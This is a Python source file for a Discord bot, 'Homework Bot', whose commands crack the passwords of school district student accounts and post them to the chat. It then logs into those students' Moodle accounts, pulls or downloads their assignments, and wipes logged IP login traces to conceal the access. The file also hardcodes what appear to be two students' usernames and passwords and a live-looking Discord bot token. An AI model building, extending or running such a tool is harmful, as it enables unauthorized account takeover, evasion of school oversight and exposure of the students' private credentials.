import time
import discord
from discord.ext import commands

from SRC.cracker import run
from SRC.moodle import Moodle, send_msg

music = None
client = commands.Bot(command_prefix="!hw ")
client.remove_command("help")
list_of_commands = [['crack [email]', "cracks password"],
                    ['login [email]', "logs into specified account"],
                    ['logout', "logs out of account"],
                    ['status', "check if logged in"],
                    ['showwork', "Shows current due work"],
                    ['showwork [class]', "Shows current due work for specific class"],
                    ['downloadwork [all] or [class]', "Downloads work then uploads it from specified class to discord"],
                    ['cleantraces', "cleans logged IP traces"]]

moodle = Moodle("nmantini9528", "Nick6776")
kenton = ("kbrake4515", "0974515")

def embed_help(list_of_list):
    total = len(list_of_list)
    embed = discord.Embed(title="Commands List", description=f"{total} Total\n", color=0xff0000)
    embed.set_author(name="Homework Bot", icon_url="https://i.imgur.com/5TFj51C.jpg")
    embed.set_thumbnail(url="https://i.imgur.com/CyLtauV.jpg")
    for list in list_of_list:
        embed.add_field(name=list[0], value=list[1], inline=False)
    embed.set_footer(text="Thank you for using homework Bot! Devloped by Nman4#6604 https://github.com/NMan1")
    return embed


@client.command(pass_context=True)
async def help(ctx):
    await ctx.send(embed=embed_help(list_of_commands))


@client.command(pass_context=True)
async def crack(ctx, *, email, for_login=False):
    if email is None:
        return

    if email.find("@neisd.net") != -1:
        await ctx.send("Sorry, that email isnt supported yet!")
        return None

    if email.find("@stu.neisd.net") == -1:
        numbers = sum(c.isdigit() for c in email)
        if numbers != 4:
            await ctx.send("Wrong usage!")
            return None

    async with ctx.typing():
        if not for_login:
            await ctx.send(f'One moment {ctx.author}')
            start = time.time()
        password = await run(ctx, email)
        if not for_login:
            end = time.time()

    if not for_login:
        embed = discord.Embed(title=f"Crack took {str(end - start)[0:4]}s!")
        embed.add_field(name=email, value=password, inline=True)
        await ctx.send(embed=embed)
    return (email.replace("@stu.neisd.net", ""), password)


@client.command(pass_context=True)
async def status(ctx):
    if moodle.check_logged_in():
        await send_msg(ctx, f"Logged into '{moodle.get_account_name()}'")
    else:
        await send_msg(ctx, "Not logged in!")


@client.command(pass_context=True)
async def login(ctx, *, email):
    if email.lower() == "default":
        pass
    elif email == "kenton" or email == "kbrake4515" or email == "kbrake4515@stu.neisd.net":
        moodle.username = kenton[0]
        moodle.password = kenton[1]
    else:
        await send_msg(ctx, "Please wait, cracking password...")
        login = ()
        login = await crack(ctx=ctx, email=email, for_login=True)
        if login is None:
            return
        moodle.username = login[0]
        moodle.password = login[1]

    if not moodle.check_logged_in():
        await moodle.login(ctx)
    else:
        await send_msg(ctx, f"Already logged into {moodle.get_account_name()}")


@client.command(pass_context=True)
async def logout(ctx,):
     if moodle.check_logged_in():
        if moodle.logout():
            await send_msg(ctx, "Logged out successfully! :white_check_mark:")
        else:
            await send_msg(ctx, "Error logging out :(")
     else:
        await send_msg(ctx, "Your not logged into any account!")


@client.command(pass_context=True)
async def showwork(ctx, *, class_=None):
    if not moodle.check_logged_in():
        await send_msg(ctx, "Please login to an account first!")
    else:
        await moodle.fetch_work(ctx, class_)


@client.command(pass_context=True)
async def download(ctx, *, class_=None):
    if not moodle.check_logged_in():
        await send_msg(ctx, "Please login to an account first!")
    else:
        if class_.lower() == "all":
            await moodle.download_work(ctx)
        else:
            await moodle.download_work(ctx, class_)


@client.command(pass_context=True)
async def cleantraces(ctx):
    if not moodle.check_logged_in():
        await send_msg(ctx, "Please login to an account first!")
    else:
        total = moodle.clean_traces()
        await send_msg(ctx, f"Cleaned {total} IP login traces! :white_check_mark:")


@client.event
async def on_ready():
    print("The bot is ready!", flush=True)


if __name__ == '__main__':
    moodle.setup()

    client.run("Njk2OTE2NjkyMzUzMTU1MTY0.XqHNSw.X8gkylhgoppSvJZ4pl91qQqwfzY")
